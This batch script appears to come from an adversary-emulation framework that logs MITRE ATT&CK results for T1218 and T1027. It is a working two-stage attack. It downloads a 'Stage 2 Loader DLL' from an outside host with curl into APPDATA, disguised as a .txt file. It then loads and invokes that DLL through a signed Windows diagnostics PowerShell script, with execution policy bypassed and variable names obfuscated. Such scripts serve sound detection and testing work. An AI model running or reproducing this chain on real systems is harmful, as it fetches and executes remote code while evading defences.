@echo off
SETLOCAL EnableDelayedExpansion

REM Placeholder constant declarations (random-named SET vars)
SET ghj=%APPDATA%\10980\c48aa6e2
SET kls=251cf5ac.txt
SET pqm=https://10.0.0.49/stage/2/icon.png?10980-7
SET rty=ITZEL-S2BO
SET uio=10980
SET zxc=7
SET vbn=%PUBLIC%\\macula-simulations.log

REM Cache timestamp once
SET tsvar=!DATE!/!TIME!

REM Ensure output directory exists
if not exist "!ghj!" mkdir "!ghj!" 2>nul

REM ===== DEBUG LOGGING =====
echo [!tsvar!][DEBUG][!rty!][!uio!]: heartbeat_start>> "!vbn!" 2>nul

REM Step 1: Heartbeat fetch – download Stage 2 Loader DLL
curl -k -s -o "!ghj!\!kls!" "!pqm!"
set hb_err=%errorlevel%
echo [!tsvar!][DEBUG][!rty!][!uio!]: heartbeat_complete=!hb_err!>> "!vbn!" 2>nul

REM Step 2: Change working directory
echo [!tsvar!][DEBUG][!rty!][!uio!]: chdir_start>> "!vbn!" 2>nul
cd /d "!ghj!" >nul 2>&1
set cd_err=%errorlevel%
echo [!tsvar!][DEBUG][!rty!][!uio!]: chdir_result=!cd_err!>> "!vbn!" 2>nul

REM Step 3: Invoke Stage 2 Loader DLL via PowerShell (msbuild equivalent via CL_LoadAssembly.ps1)
echo [!tsvar!][DEBUG][!rty!][!uio!]: dll_load_start>> "!vbn!" 2>nul

powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; $n=[AppDomain]::CurrentDomain.GetAssemblies().Count; LoadAssemblyFromPath %APPDATA%\10980\c48aa6e2\251cf5ac.txt; $asm=([AppDomain]::CurrentDomain.GetAssemblies() | Select-Object -Skip $n -First 1); ($asm.GetExportedTypes() | ForEach-Object { $_.GetMethods([Reflection.BindingFlags]'Public,Static') | Where-Object { $_.GetParameters().Count -eq 0 } } | Select-Object -First 1).Invoke($null,$null)"
set ps_err=%errorlevel%

echo [!tsvar!][DEBUG][!rty!][!uio!]: dll_load_complete=!ps_err!>> "!vbn!" 2>nul

REM Determine overall result (combine errors)
set overall_err=0
if !hb_err! neq 0 set overall_err=1
if !cd_err! neq 0 set overall_err=1
if !ps_err! neq 0 set overall_err=1

if !overall_err! equ 0 (
    set result1218=OK
    set error1218=
) else (
    set result1218=FAIL
    if !hb_err! neq 0 (set error1218=heartbeat) else if !cd_err! neq 0 (set error1218=chdir) else (set error1218=powershell)
)

REM TTP Logging – both T1218 and T1027 use same result (script covers both TTPs)
echo [!tsvar!][TTP][!rty!][!uio!]: T1218^|System Binary Proxy Execution=!result1218!:!error1218!>> "!vbn!" 2>nul
echo [!tsvar!][TTP][!rty!][!uio!]: T1027^|Obfuscated Files or Information=!result1218!:!error1218!>> "!vbn!" 2>nul

ENDLOCAL